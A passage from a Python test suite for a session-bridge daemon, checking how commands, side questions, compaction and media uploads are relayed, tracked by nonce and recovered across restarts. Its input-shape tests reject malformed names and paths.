        self.mod.commands.clear()
        policy.write({"read_only": True, "ceiling": "auto"})
        self.refused(self.send("command", args), "read-only")
        self.assertEqual(self.mod.ops("command"), [])

    def test_l_a_commands_shape(self):
        for args in ({"name": ""}, {"name": "x" * 129}, {"name": "re\nname"}, {"name": 5}, {},
                     {"name": "rename", "args": "x" * 4097}, {"name": "rename", "args": ["x"]}):
            self.refused(self.send("command", {"session": self.bridged.sid, **args}), "bad-shape")
        self.assertEqual(self.mod.ops("command"), [], "nothing reached the bridge")

    def test_l_a_command_answers_at_once_and_its_run_follows_as_op_carrying_the_nonce(self):
        reqs = self.following()
        self.r.kinds = frozenset({"op"})
        asked = self.send("command", {"session": self.bridged.sid, "name": "rename", "args": "desk-m0"})
        o = self.outcome(asked)
        cmd = self.mod.ops("command")[-1]
        self.assertEqual(o, {"state": "done", "result": {"queued": True, "route": "run", "id": cmd["id"]}})
        self.assertEqual((cmd["name"], cmd["args"], cmd["rpc"], cmd["from"]),
                         ("rename", "desk-m0", asked["nonce"], "desk"))
        got = wait_for(lambda: len(self.op_messages(reqs)) >= 2 and self.op_messages())
        self.assertTrue(got, "the run's start and end, as DX4 op")
        head = {"rpc": asked["nonce"], "op": "command", "id": cmd["id"], "name": "rename", "args": "desk-m0", "t": 0}
        self.assertEqual([m["body"] for m in got],
                         [{**head, "phase": "start"},
                          {**head, "phase": "end", "settled": {"ok": True},
                           "readback": {"how": "row", "text": "Session renamed to: desk-m0", "uuid": "row-r1"}}])
        m = got[0]
        self.assertEqual((m["project"], m["machine"], m["session"], m["sub"], m["n"]),
                         (self.pid, "testhost", self.bridged.sid, None, None), "session-wide: no sub is needed")
        self.assertNotIn("op_id", self.ledger()[asked["nonce"]], "the command is not kept once its run ended")

    def test_l_a_refused_command_fails_with_the_bridges_code_first(self):
        self.mod.refuse_commands = {"usage": ("panel", "opens a panel in the terminal; it would hold the session's "
                                                       "queue")}
        asked = self.send("command", {"session": self.bridged.sid, "name": "usage"})
        o = self.refused(asked, "failed")
        self.assertEqual(o["error"]["message"],
                         "panel: opens a panel in the terminal; it would hold the session's queue")
        self.assertNotIn("op_id", self.ledger()[asked["nonce"]], "nothing ran: nothing is kept for its run")

    def test_l_a_hub_that_lists_no_op_is_sent_none(self):
        reqs = self.following()
        asked = self.send("command", {"session": self.bridged.sid, "name": "rename", "args": "x"})
        self.assertEqual(self.outcome(asked)["state"], "done")
        self.assertTrue(wait_for(lambda: reqs.take() or any(e.get("phase") == "end" for _, _, e in reqs.ops)),
                        "the run's end was read")
        self.assertEqual(self.op_messages(reqs), [], "none goes up")
        self.assertEqual(self.r.messages, [], "and none is owed")

    def test_l_a_restart_between_queued_and_ran_keeps_the_nonce(self):
        """A8: the daemon restarts while the command waits for its turn; its
        run's end still goes up under the RPC's nonce, read from the stream."""
        reqs = self.following()
        self.mod.hold_runs = True
        asked = self.send("command", {"session": self.bridged.sid, "name": "rename", "args": "after"})
        self.assertEqual(self.outcome(asked)["state"], "done")
        self.assertEqual(self.ledger()[asked["nonce"]]["op_id"], self.mod.ops("command")[-1]["id"], "kept on the claim")
        self.r = rpcs.Rpcs(KEY, "testhost", clock=lambda: self.clock[0])   # the daemon restarted
        self.r.kinds = frozenset({"op"})
        self.frames = []
        self.mod.post(*self.mod.held_runs)
        got = wait_for(lambda: [m for m in self.op_messages(reqs) if m["body"]["phase"] == "end"])
        self.assertTrue(got, "the end, relayed after the restart")
        self.assertEqual((got[0]["body"]["rpc"], got[0]["body"]["readback"]["how"]), (asked["nonce"], "row"))

    def test_l_an_end_that_came_while_the_daemon_was_stopped_goes_up_from_the_bridges_file(self):
        reqs = self.following()
        self.mod.hold_runs = True
        asked = self.send("command", {"session": self.bridged.sid, "name": "rename", "args": "while-down"})
        self.assertEqual(self.outcome(asked)["state"], "done")
        reqs.close()                                       # the daemon stops: nothing reads the stream
        self.mod.post(*self.mod.held_runs)
        kept = lambda: ((bridgemod.load_kept(self.bridged.sid).get("rpcs") or {}).get(asked["nonce"]) or {}).get("end")
        self.assertTrue(wait_for(kept), "the child kept the end beside the answer")
        self.r = rpcs.Rpcs(KEY, "testhost", clock=lambda: self.clock[0])   # and starts again
        self.r.kinds = frozenset({"op"})
        self.frames = []
        got = wait_for(lambda: self.op_messages())
        self.assertTrue(got, "the end, read from the bridge's file")
        self.assertEqual([(m["body"]["rpc"], m["body"]["phase"], m["body"]["args"]) for m in got],
                         [(asked["nonce"], "end", "while-down")])
        self.assertNotIn("op_id", self.ledger()[asked["nonce"]], "forgotten once it went")
        self.assertEqual(self.op_messages(), got, "and sent once")

    def claimed_before_a_stop(self):
        """A rename the bridge answered, its claim as a stop between the
        answer and the keeping of its id leaves it, and its end kept by the
        child meanwhile: (the RPC, the command's id)."""
        self.following()
        self.mod.hold_runs = True
        asked = self.send("command", {"session": self.bridged.sid, "name": "rename", "args": "in-the-gap"})
        self.assertEqual(self.outcome(asked)["state"], "done")
        cid = self.mod.ops("command")[-1]["id"]
        path = os.path.join(os.environ["SMINOS_HOME"], "daemon", rpcs.LEDGER_FILE)
        entries = self.ledger()
        e = entries[asked["nonce"]]
        self.assertEqual((e.get("op_name"), e.get("op_args")), ("rename", "in-the-gap"), "kept before the command went")
        entries[asked["nonce"]] = {k: v for k, v in e.items()
                                   if k not in ("op_id", "outcome", "done_at", "acked")}   # the claim the stop left
        sminos.write_json(path, entries)
        self.mod.post(*self.mod.held_runs)
        kept = lambda: ((bridgemod.load_kept(self.bridged.sid).get("rpcs") or {}).get(asked["nonce"]) or {}).get("end")
        self.assertTrue(wait_for(kept), "the child kept the end beside the answer")
        return asked, cid

    def test_l_a_command_claimed_before_a_stop_is_reconciled_and_its_end_still_goes_up(self):
        """A8, the narrowest window: the daemon stops after the bridge
        answered the command and before its id was kept on the claim. The
        restart reconciles the claim from the child's kept answer, keeps the
        command's id on it, and sends the end the child kept meanwhile."""
        asked, cid = self.claimed_before_a_stop()
        self.r = rpcs.Rpcs(KEY, "testhost", clock=lambda: self.clock[0])   # the restart reconciles the claim
        self.r.kinds = frozenset({"op"})
        self.frames = []
        self.assertEqual(self.outcome(asked), {"state": "done", "result": {"queued": True, "route": "run", "id": cid}})
        got = wait_for(lambda: self.op_messages())
        self.assertTrue(got, "the end, read from the bridge's file")
        self.assertEqual([(m["body"]["rpc"], m["body"]["phase"], m["body"]["id"]) for m in got],
                         [(asked["nonce"], "end", cid)])
        self.assertNotIn("op_id", self.ledger()[asked["nonce"]], "and forgotten once it went")

    def test_l_a_command_reconciled_by_a_restart_that_stops_again_still_sends_its_end(self):
        """A8, the reconciling restart's own window: it stops again before
        it writes the claim's outcome. The command's id is kept on the claim
        before the claim is answered, so the claim stays open, and the next
        restart reconciles it and sends the end."""
        asked, cid = self.claimed_before_a_stop()
        with mock.patch.object(rpcs.Ledger, "answer", side_effect=RuntimeError("a stop before the outcome is kept")):
            with self.assertRaisesRegex(RuntimeError, "a stop"):
                rpcs.Rpcs(KEY, "testhost", clock=lambda: self.clock[0])
        e = self.ledger()[asked["nonce"]]
        self.assertNotIn("outcome", e, "the claim is still open")
        self.assertEqual((e.get("op_id"), e.get("op_name"), e.get("op_args")), (cid, "rename", "in-the-gap"),
                         "the command's id kept before the claim was answered")
        self.r = rpcs.Rpcs(KEY, "testhost", clock=lambda: self.clock[0])   # the second restart
        self.r.kinds = frozenset({"op"})
        self.frames = []
        self.assertEqual(self.outcome(asked), {"state": "done", "result": {"queued": True, "route": "run", "id": cid}})
        got = wait_for(lambda: self.op_messages())
        self.assertTrue(got, "the end, read from the bridge's file")
        self.assertEqual([(m["body"]["rpc"], m["body"]["phase"], m["body"]["id"]) for m in got],
                         [(asked["nonce"], "end", cid)])

    def test_l_a_command_whose_id_cannot_be_kept_is_not_answered_until_it_is(self):
        """A reconciling restart that cannot keep the command's id leaves
        the claim open rather than answer it with nothing left to follow its
        run; once the ledger can be written, the claim is answered and the
        end goes up."""
        asked, cid = self.claimed_before_a_stop()
        real = rpcs.Ledger.change
        def refused(ledger, nonce, entry):
            if "op_id" in entry and "outcome" not in entry:
                raise OSError("disk full")
            return real(ledger, nonce, entry)
        with mock.patch.object(rpcs.Ledger, "change", refused):
            self.r = rpcs.Rpcs(KEY, "testhost", clock=lambda: self.clock[0])
        self.r.kinds = frozenset({"op"})
        e = self.ledger()[asked["nonce"]]
        self.assertNotIn("outcome", e, "not answered while its id is not kept")
        self.assertNotIn("op_id", e)
        self.clock[0] += rpcs.RECONCILE_EVERY + 1
        self.frames = []
        self.assertEqual(self.outcome(asked), {"state": "done", "result": {"queued": True, "route": "run", "id": cid}})
        got = wait_for(lambda: self.op_messages())
        self.assertEqual([(m["body"]["rpc"], m["body"]["phase"], m["body"]["id"]) for m in got],
                         [(asked["nonce"], "end", cid)])

    def test_l_a_reload_from_the_cli_is_finished_by_the_child_that_replaces_its_bridge(self):
        """`sminos command <member> reload-plugins` sends no nonce: its start,
        relayed by the child it replaces and naming it, is tracked by session,
        and its end is the effect — the session's bridge answering from the
        child that replaced that one (here a real one: the child stopped, a
        new one spawned, as a module reload does)."""
        session = tpr.Session(self.root)
        mod = Mod(session.sid)
        self.addCleanup(session.end)
        sminos.forget_caches()
        reqs = requests.Requests(KEY, "testhost")
        reqs.follow({session.sid: self.pid})
        self.addCleanup(reqs.close)
        self.assertTrue(wait_for(lambda: reqs.take() or session.sid in reqs.synced))
        self.r.kinds = frozenset({"op"})
        status, out = bridgemod.request(mod.sock, "POST", "/command?wait=5000", {"op": "command", "name": "reload-plugins"})
        self.assertEqual((status, out["ok"]), (200, True))
        starts = wait_for(lambda: [m for m in self.op_messages(reqs) if m["body"]["phase"] == "start"])
        self.assertTrue(starts, "its start, relayed")
        old = starts[0]["body"]["child"]
        self.assertEqual(starts[0]["body"]["rpc"], None)
        bridges = plane.Bridges()
        now = [0.0]

        def answering():
            now[0] += plane.BRIDGE_RECHECK
            bridges.answers(session.sid, now[0])
            return held_child(bridges, session.sid)

        self.assertTrue(wait_for(lambda: answering() == old), "the plane finds the child that took it answering")
        self.r.effects(bridges.answering)
        self.assertEqual([m["body"]["phase"] for m in self.op_messages()], ["start"], "not done while it answers")
        mod.stop()
        mod = Mod(session.sid)    # the reloaded module's child
        self.addCleanup(mod.stop)
        self.assertTrue(wait_for(lambda: answering() not in (None, old)), "another child answers")
        self.r.effects(bridges.answering)
        end = self.op_messages()[-1]["body"]
        self.assertEqual({k: end[k] for k in ("rpc", "phase", "id", "name", "settled", "readback")},
                         {"rpc": None, "phase": "end", "id": starts[0]["body"]["id"], "name": "reload-plugins",
                          "settled": {"ok": True}, "readback": {"how": "effect"}})

    def test_l_reload_text_and_effect_race_ends_once_with_or_without_rpc(self):
        """The real child relays text; the daemon arbitrates it against a
        fresh successor and the deadline. CLI ops have no nonce to dedupe by."""
        reqs = self.following()
        self.r.kinds = frozenset({"op"})
        text = "Reloaded: 10 plugins · 23 skills · 17 agents · 13 hooks"
        for rpc in (True, False):
            for winner in ("text", "effect"):
                with self.subTest(rpc=rpc, winner=winner):
                    if rpc:
                        asked = self.send("command", {"session": self.bridged.sid, "name": "reload-plugins"})
                        self.assertEqual(self.outcome(asked)["state"], "done")
                    else:
                        status, answer = bridgemod.request(self.mod.sock, "POST", "/command?wait=5000",
                                                          {"op": "command", "name": "reload-plugins"})
                        self.assertEqual((status, answer["ok"]), (200, True))
                    cid = self.mod.ops("command")[-1]["id"]
                    starts = wait_for(lambda: [m["body"] for m in self.op_messages(reqs)
                                             if m["body"]["id"] == cid and m["body"]["phase"] == "start"])
                    self.assertTrue(starts)
                    start = starts[0]
                    probes = Probes()
                    probes.answer(start["child"])
                    self.r.effects(probes.answering)
                    end = {"type": "run", "phase": "end", "id": cid, "name": "reload-plugins", "args": "",
                           "settled": {"ok": True, "text": text}, "readback": {"how": "text", "text": text}}
                    ends = lambda: [m["body"] for m in self.op_messages(reqs)
                                    if m["body"]["id"] == cid and m["body"]["phase"] == "end"]
                    logpath = os.path.join(os.environ["SMINOS_HOME"], "daemon.log")
                    if winner == "effect":
                        probes.answer([start["child"][0] + 1, start["child"][1] + 1])
                        self.r.effects(probes.answering)
                    self.mod.post(end)
                    self.assertTrue(wait_for(ends))
                    # Stream replay can bring its start and end again, with
                    # no nonce after the child has released its mapping.
                    self.mod.post({**start, "type": "run"}, end)
                    self.assertTrue(wait_for(lambda: not self.r.op_ids.get(cid)))
                    self.clock[0] += rpcs.RELOAD_WAIT_S
                    self.r.effects(probes.answering)
                    self.r.recover_ops()
                    self.r.ops([(self.bridged.sid, self.pid, {**start, "type": "run"}),
                                (self.bridged.sid, self.pid, end)])
                    self.assertEqual(len(ends()), 1, "late text, a replayed start, and the deadline cannot end it twice")
                    self.assertEqual(ends()[0]["readback"], {"how": "text", "text": text} if winner == "text" else {"how": "effect"})
                    with open(logpath) as f:
                        logged = [line for line in f if cid in line and "reload-plugins end" in line]
                    self.assertEqual(len(logged), 1)
                    self.assertIn("how=" + winner, logged[0])

    def test_l_reload_plugins_is_done_by_another_child_answering_or_fails_at_its_bound(self):
        reqs = self.following()
        self.r.kinds = frozenset({"op"})
        same = [os.stat(self.mod.sock).st_ino, self.mod.proc.pid]
        reload = self.send("command", {"session": self.bridged.sid, "name": "reload-plugins"})
        self.assertEqual(self.outcome(reload)["state"], "done")
        cid = self.mod.ops("command")[-1]["id"]
        self.assertTrue(wait_for(lambda: self.op_messages(reqs)), "its start")
        probes = Probes()
        probes.answer(same)
        self.r.effects(probes.answering)
        probes.answer(same)
        self.r.effects(probes.answering)
        self.assertEqual([m["body"]["phase"] for m in self.op_messages(reqs)], ["start"],
                         "the child that took it answers still: not done")
        probes.answer([same[0] + 1, same[1] + 1])
        self.r.effects(probes.answering)
        end = self.op_messages()[-1]["body"]
        self.assertEqual({k: end[k] for k in ("rpc", "phase", "id", "name", "settled", "readback")},
                         {"rpc": reload["nonce"], "phase": "end", "id": cid, "name": "reload-plugins",
                          "settled": {"ok": True}, "readback": {"how": "effect"}})
        # A second one, which no other child answers: failed at the bound, the claim kept across a restart.
        again = self.send("command", {"session": self.bridged.sid, "name": "reload-plugins"})
        self.assertEqual(self.outcome(again)["state"], "done")
        self.r = rpcs.Rpcs(KEY, "testhost", clock=lambda: self.clock[0])
        self.r.kinds = frozenset({"op"})
        self.frames = []
        probes.answer(same)
        self.r.effects(probes.answering)
        self.assertEqual(self.op_messages(), [], "within its bound, nothing")
        self.clock[0] += rpcs.RELOAD_WAIT_S
        self.r.effects(probes.answering)
        end = self.op_messages()[-1]["body"]
        self.assertEqual((end["rpc"], end["settled"]["ok"], end["readback"]), (again["nonce"], False, {"how": "none"}))
        self.assertTrue(end["settled"]["error"])
        self.r.effects(probes.answering)
        with open(os.path.join(os.environ["SMINOS_HOME"], "daemon.log")) as f:
            logged = [line for line in f if "id=" + end["id"] in line and "reload-plugins end" in line]
        self.assertEqual(len(logged), 1)
        self.assertIn("how=timeout", logged[0])

    def test_l_a_reload_is_not_done_by_the_child_the_plane_held_before_its_own(self):
        """The plane answers from its last probe: a child replaced just
        before a reload is sent can still be the one it holds, and that is
        not the reload's effect. Only a probe begun after the reload was
        first looked at is evidence."""
        session = tpr.Session(self.root)
        self.addCleanup(session.end)
        mod = Mod(session.sid)
        self.here.sessions.add(session.sid)
        self.here.live[session.sid] = {"pid": session.holder.pid, "kind": "interactive", "status": "busy"}
        self.r.kinds = frozenset({"op"})
        bridges, now = plane.Bridges(), [0.0]

        def probed(child):
            """Whether the plane holds `child`; else another probe begun, so
            none is in flight once it does."""
            if held_child(bridges, session.sid) == child:
                return True
            now[0] += plane.BRIDGE_RECHECK
            bridges.answers(session.sid, now[0])
            return False

        first = [os.stat(mod.sock).st_ino, mod.proc.pid]
        self.assertTrue(wait_for(lambda: probed(first)), "the plane holds the first child")
        mod.stop()
        mod = Mod(session.sid)   # its successor, which the plane has not probed yet
        self.addCleanup(mod.stop)
        second = [os.stat(mod.sock).st_ino, mod.proc.pid]
        reload = self.send("command", {"session": session.sid, "name": "reload-plugins"})
        self.assertEqual(self.outcome(reload)["state"], "done")
        self.r.take()
        ends = lambda: [f["message"]["body"] for f in self.r.messages
                        if f["message"]["kind"] == "op" and f["message"]["body"]["phase"] == "end"]
        self.r.effects(bridges.answering)
        self.assertEqual(ends(), [], "the predecessor the plane still held is not the reload's effect")
        self.assertTrue(wait_for(lambda: probed(second)), "the plane finds the child that took it")
        self.r.effects(bridges.answering)
        self.assertEqual(ends(), [], "the child that took it answers still: not done")

    def test_l_surviving_reload_text_is_recovered_after_daemon_restart(self):
        reload = self.send("command", {"session": self.bridged.sid, "name": "reload-plugins"})
        self.assertEqual(self.outcome(reload)["state"], "done")
        cid = self.mod.ops("command")[-1]["id"]
        text = "Reloaded: 10 plugins"
        self.mod.post({"type": "run", "phase": "end", "id": cid, "name": "reload-plugins", "args": "",
                       "settled": {"ok": True, "text": text}, "readback": {"how": "text", "text": text}})
        kept = lambda: ((bridgemod.load_kept(self.bridged.sid).get("rpcs") or {}).get(reload["nonce"]) or {}).get("end")
        self.assertTrue(wait_for(kept))
        self.r = rpcs.Rpcs(KEY, "testhost", clock=lambda: self.clock[0])
        self.r.kinds = frozenset({"op"})
        self.clock[0] += rpcs.RELOAD_WAIT_S
        self.r.effects(Probes().answering)
        self.r.recover_ops()
        ends = [f["message"]["body"] for f in self.r.messages if f["message"]["kind"] == "op"]
        self.assertEqual([(e["id"], e["rpc"], e["readback"]) for e in ends],
                         [(cid, reload["nonce"], {"how": "text", "text": text})])

    def test_l_a_reload_refused_while_the_daemon_was_stopped_ends_as_its_child_kept_it(self):
        """A reload the engine refused is ended by the module that took it,
        and its child keeps that end beside the answer: a daemon stopped
        when it came sends it on its restart, rather than the bound's
        failure, or another child's answer read as the reload's effect."""
        why = "the plugins could not be reloaded: a plugin failed to load"
        self.mod.refuse_reload = why
        self.mod.hold_runs = True
        reload = self.send("command", {"session": self.bridged.sid, "name": "reload-plugins"})
        self.assertEqual(self.outcome(reload)["state"], "done")
        cid = self.mod.ops("command")[-1]["id"]
        self.mod.post(*self.mod.held_runs)   # the daemon is stopped: no stream reads it
        kept = lambda: ((bridgemod.load_kept(self.bridged.sid).get("rpcs") or {}).get(reload["nonce"]) or {}).get("end")
        self.assertTrue(wait_for(kept), "the child kept the end beside the answer")
        self.r = rpcs.Rpcs(KEY, "testhost", clock=lambda: self.clock[0])   # the restart
        self.r.kinds = frozenset({"op"})
        ends = lambda: [f["message"]["body"] for f in self.r.messages
                        if f["message"]["kind"] == "op" and f["message"]["body"]["phase"] == "end"]
        self.assertEqual([(b["rpc"], b["id"], b["name"], b["settled"], b["readback"]) for b in ends()],
                         [(reload["nonce"], cid, "reload-plugins", {"ok": False, "error": why}, {"how": "none"})])
        probes = Probes()
        self.r.effects(probes.answering)
        probes.answer([os.stat(self.mod.sock).st_ino + 1, self.mod.proc.pid + 1])
        self.clock[0] += rpcs.RELOAD_WAIT_S
        self.r.effects(probes.answering)
        self.assertEqual(len(ends()), 1, "ended once: neither the bound nor another child ends it again")

    def test_l_a_command_running_when_its_child_is_replaced_keeps_its_end(self):
        """A child replaced while a desk command it carried still runs in
        the mod (it crashed, and the module spawned another): the new child
        knows the command's nonce from the answer the old one kept, so the
        run's end carries it and is kept beside that answer."""
        session = tpr.Session(self.root)
        self.addCleanup(session.end)
        mod = Mod(session.sid)
        mod.hold_runs = True
        status, out = bridgemod.request(mod.sock, "POST", "/command?wait=5000",
                                        {"op": "command", "name": "rename", "args": "across", "rpc": "nonce-across"})
        self.assertEqual((status, out["ok"]), (200, True))
        self.assertTrue(wait_for(lambda: mod.held_runs), "its run's end, held in the mod")
        held = list(mod.held_runs)
        mod.stop()
        mod = Mod(session.sid)   # the respawned child
        self.addCleanup(mod.stop)
        mod.post(*held)
        kept = lambda: ((bridgemod.load_kept(session.sid).get("rpcs") or {}).get("nonce-across") or {}).get("end")
        self.assertTrue(wait_for(kept, 5.0), "the new child kept the end under its nonce")
        self.assertEqual((kept()["id"], kept()["rpc"], kept()["settled"]), (out["result"]["id"], "nonce-across", {"ok": True}))

    # ------------------------------------------------ a side question, compact's instructions (MW2)

    def test_m2_a_side_questions_shape(self):
        for args in ({}, {"prompt": ""}, {"prompt": "   "}, {"prompt": 5}, {"prompt": "x" * 8193}):
            self.refused(self.send("btw", {"session": self.bridged.sid, **args}), "bad-shape")
        self.assertEqual(self.mod.ops("btw"), [], "nothing reached the bridge")
        asked = self.send("btw", {"session": self.bridged.sid, "prompt": "x" * 8192})
        self.assertEqual(self.outcome(asked)["state"], "done", "8,192 characters is a question")

    def test_m2_a_side_question_answers_started_and_its_answer_follows_as_op_carrying_the_nonce(self):
        reqs = self.following()
        self.r.kinds = frozenset({"op"})
        prompt = "what did we decide\nabout the cache?"
        asked = self.send("btw", {"session": self.bridged.sid, "prompt": prompt})
        o = self.outcome(asked)
        cmd = self.mod.ops("btw")[-1]
        self.assertEqual(o, {"state": "done", "result": {"started": True, "id": cmd["id"]}})
        self.assertEqual((cmd["prompt"], cmd["rpc"]), (prompt, asked["nonce"]), "the question as asked, under the nonce")
        got = wait_for(lambda: len(self.op_messages(reqs)) >= 2 and self.op_messages())
        self.assertTrue(got, "the side question's start and end, as DX4 op")
        head = {"rpc": asked["nonce"], "op": "btw", "id": cmd["id"], "t": 0}
        self.assertEqual([m["body"] for m in got],
                         [{**head, "phase": "start"},
                          {**head, "phase": "end", "text": "Keep it per session.",
                           "usage": {"input": 12, "output": 34, "cacheRead": 5000, "cacheWrite": 7}}])
        self.assertEqual((got[0]["session"], got[0]["sub"]), (self.bridged.sid, None), "session-wide")
        self.assertNotIn("op_id", self.ledger()[asked["nonce"]], "not kept once its end went up")

    def test_m2_a_refused_side_question_fails_with_the_bridges_code_first(self):
        self.mod.refuse_btw = ("nothing-to-fork", "nothing to fork yet: the session has made no model request")
        asked = self.send("btw", {"session": self.bridged.sid, "prompt": "anything?"})
        o = self.refused(asked, "failed")
        self.assertEqual(o["error"]["message"], "nothing-to-fork: nothing to fork yet: the session has made no model request")
        self.assertNotIn("op_id", self.ledger()[asked["nonce"]], "nothing started: nothing is kept for it")

    def test_m2_a_side_question_needs_a_bridge_and_a_machine_that_runs_rpcs(self):
        self.refused(self.send("btw", {"session": self.plain.sid, "prompt": "anything?"}), "unsupported")
        policy.write({"read_only": True, "ceiling": "auto"})
        self.refused(self.send("btw", {"session": self.bridged.sid, "prompt": "anything?"}), "read-only")
        self.assertEqual(self.mod.ops("btw"), [])

    def test_m2_a_side_questions_end_that_came_while_the_daemon_was_stopped_goes_up_as_btw(self):
        reqs = self.following()
        self.mod.hold_runs = True
        asked = self.send("btw", {"session": self.bridged.sid, "prompt": "while down"})
        self.assertEqual(self.outcome(asked)["state"], "done")
        self.assertEqual(self.ledger()[asked["nonce"]]["op_id"], self.mod.ops("btw")[-1]["id"], "kept on the claim")
        reqs.close()                                       # the daemon stops: nothing reads the stream
        self.mod.post(*self.mod.held_runs)
        kept = lambda: ((bridgemod.load_kept(self.bridged.sid).get("rpcs") or {}).get(asked["nonce"]) or {}).get("end")
        self.assertTrue(wait_for(kept), "the child kept the end beside the answer")
        self.r = rpcs.Rpcs(KEY, "testhost", clock=lambda: self.clock[0])   # and starts again
        self.r.kinds = frozenset({"op"})
        self.frames = []
        got = wait_for(lambda: self.op_messages())
        self.assertTrue(got, "the end, read from the bridge's file")
        self.assertEqual([(m["body"]["op"], m["body"]["rpc"], m["body"]["phase"], m["body"]["text"]) for m in got],
                         [("btw", asked["nonce"], "end", "Keep it per session.")])
        self.assertNotIn("op_id", self.ledger()[asked["nonce"]], "forgotten once it went")

    def test_m2_a_side_question_claimed_before_a_stop_is_reconciled_and_its_end_goes_up_as_btw(self):
        """The daemon stops after the bridge answered the side question and
        before its id was kept on the claim: the restart reconciles the claim
        from the child's kept answer and sends the end the child kept."""
        self.following()
        self.mod.hold_runs = True
        asked = self.send("btw", {"session": self.bridged.sid, "prompt": "in the gap"})
        self.assertEqual(self.outcome(asked)["state"], "done")
        bid = self.mod.ops("btw")[-1]["id"]
        path = os.path.join(os.environ["SMINOS_HOME"], "daemon", rpcs.LEDGER_FILE)
        entries = self.ledger()
        entries[asked["nonce"]] = {k: v for k, v in entries[asked["nonce"]].items()
                                   if k not in ("op_id", "outcome", "done_at", "acked")}   # the claim the stop left
        sminos.write_json(path, entries)
        self.mod.post(*self.mod.held_runs)
        kept = lambda: ((bridgemod.load_kept(self.bridged.sid).get("rpcs") or {}).get(asked["nonce"]) or {}).get("end")
        self.assertTrue(wait_for(kept), "the child kept the end beside the answer")
        self.r = rpcs.Rpcs(KEY, "testhost", clock=lambda: self.clock[0])   # the restart reconciles the claim
        self.r.kinds = frozenset({"op"})
        self.frames = []
        self.assertEqual(self.outcome(asked), {"state": "done", "result": {"started": True, "id": bid}})
        got = wait_for(lambda: self.op_messages())
        self.assertEqual([(m["body"]["op"], m["body"]["rpc"], m["body"]["phase"], m["body"]["id"]) for m in got],
                         [("btw", asked["nonce"], "end", bid)])

    def test_m2_compact_takes_instructions(self):
        for instructions in (5, "x" * 4097, ["keep"]):
            self.refused(self.send("compact", {"session": self.bridged.sid, "instructions": instructions}), "bad-shape")
        self.assertEqual(self.mod.ops("compact"), [], "nothing reached the bridge")
        asked = self.send("compact", {"session": self.bridged.sid, "instructions": "keep the plan\nand the open questions"})
        self.assertEqual(self.outcome(asked), {"state": "done", "result": {"at": "now"}})
        self.assertEqual(self.mod.ops("compact")[-1]["instructions"], "keep the plan\nand the open questions")
        bare = self.send("compact", {"session": self.bridged.sid})
        self.assertEqual(self.outcome(bare)["state"], "done")
        self.assertNotIn("instructions", self.mod.ops("compact")[-1], "none asked: none passed")
        edge = self.send("compact", {"session": self.bridged.sid, "instructions": "x" * 4096})
        self.assertEqual(self.outcome(edge)["state"], "done", "4,096 characters are instructions")

    # ------------------------------------------------ image and PDF intake (MW5)

    def attachments(self, *files):
        return [{"name": name, "mediaType": media_type, "data": base64.b64encode(data).decode("ascii")}
                for name, media_type, data in files]

    def upload(self, *files, session=None):
        files = files or (("shot.png", "image/png", PNG),)
        return self.send("media", {"session": session or self.bridged.sid, "attachments": self.attachments(*files),
                                   "delivery": "queued-turn"})

    def uploads_of(self, base, sid=None):
        root = os.path.join(os.path.realpath(base), ".claude", "desk-uploads", sid or self.bridged.sid)
        return sorted(os.listdir(root)) if os.path.isdir(root) else []

    def test_m5_an_uploads_shape(self):
        good = self.attachments(("shot.png", "image/png", PNG))[0]
        for args in ({"attachments": [good]},                                       # no delivery
                     {"attachments": [good], "delivery": "now"},
                     {"attachments": [good], "delivery": "queued-turn", "text": "look"},   # words go as a Send
                     {"attachments": [], "delivery": "queued-turn"},
                     {"attachments": [good] * 5, "delivery": "queued-turn"},
                     {"attachments": [{**good, "mediaType": "application/pdf"}], "delivery": "queued-turn"},
                     {"attachments": [{**good, "data": "%%%"}], "delivery": "queued-turn"},
                     {"attachments": [{**good, "name": "../shot.png"}], "delivery": "queued-turn"},
                     {"attachments": [{**good, "mediaType": []}], "delivery": "queued-turn"},
                     {"attachments": [{**good, "mediaType": {}}], "delivery": "queued-turn"},
                     {"attachments": [{**good, "name": ["shot.png"]}], "delivery": "queued-turn"},
                     {"attachments": [{**good, "data": {}}], "delivery": "queued-turn"},
                     {"attachments": {"0": good}, "delivery": "queued-turn"},
                     {"attachments": [good], "delivery": ["queued-turn"]}):
            self.refused(self.send("media", {"session": self.bridged.sid, **args}), "bad-shape")
        self.assertEqual(self.mod.ops("media") + self.mod.ops("read"), [], "nothing reached the bridge")
        self.assertEqual(self.uploads_of(self.root), [], "nothing saved")

    def test_m5_an_upload_is_saved_under_the_live_cwd_and_answered_queued_once_the_bridge_holds_it(self):
        sub = os.path.join(self.root, "moved-" + uuidlib.uuid4().hex[:6])   # where a /cd took the session
        os.makedirs(sub)
        self.mod.cwd = sub
        asked = self.upload(("photo", "image/png", PNG), ("photo", "application/pdf", PDF), ("x.jpg", "image/png", PNG))
        n = asked["nonce"]
        root = os.path.join(os.path.realpath(sub), ".claude", "desk-uploads", self.bridged.sid)
        paths = [n + ".0.png", n + ".1.pdf", n + ".2.png"]
        self.assertEqual(self.outcome(asked), {"state": "done", "result": {
            "queued": True, "upload": n, "intake": "native-read", "root": root, "paths": paths}})
        cmd = self.mod.ops("media")[-1]
        self.assertEqual((cmd["upload"], cmd["rpc"], cmd["root"]), (n, n, root), "the upload is the nonce")
        self.assertEqual(cmd["files"], [
            {"n": 0, "path": os.path.join(root, paths[0]), "name": "photo", "mediaType": "image/png"},
            {"n": 1, "path": os.path.join(root, paths[1]), "name": "photo", "mediaType": "application/pdf"},
            {"n": 2, "path": os.path.join(root, paths[2]), "name": "x.jpg", "mediaType": "image/png"}])
        with open(os.path.join(root, paths[1]), "rb") as f:
            self.assertEqual(f.read(), PDF)
        self.assertEqual(self.mod.ops("read")[-1]["what"], "status", "the cwd read from the live session")
        with open(os.path.join(self.root, ".git", "info", "exclude")) as f:
            self.assertIn(media.EXCLUDE_LINE, f.read().splitlines())
        self.assertEqual(self.ledger()[n]["op_id"], n, "followed to its end under the upload")

    def test_m5_an_uploads_states_go_up_as_op_carrying_the_nonce(self):
        reqs = self.following()
        self.r.kinds = frozenset({"op"})
        asked = self.upload()
        n = asked["nonce"]
        self.assertEqual(self.outcome(asked)["state"], "done")
        got = wait_for(lambda: len(self.op_messages(reqs)) >= 2 and self.op_messages())
        self.assertTrue(got, "the attachment's read and forwarded, as DX4 op")
        head = {"rpc": n, "op": "media", "id": n, "upload": n, "index": 0, "toolUseId": "toolu_sminos_%024d" % 0}
        self.assertEqual([m["body"] for m in got],
                         [{**head, "state": "read", "phase": "start", "attachments": [{"index": 0, "state": "read"}]},
                          {**head, "state": "forwarded", "phase": "end",
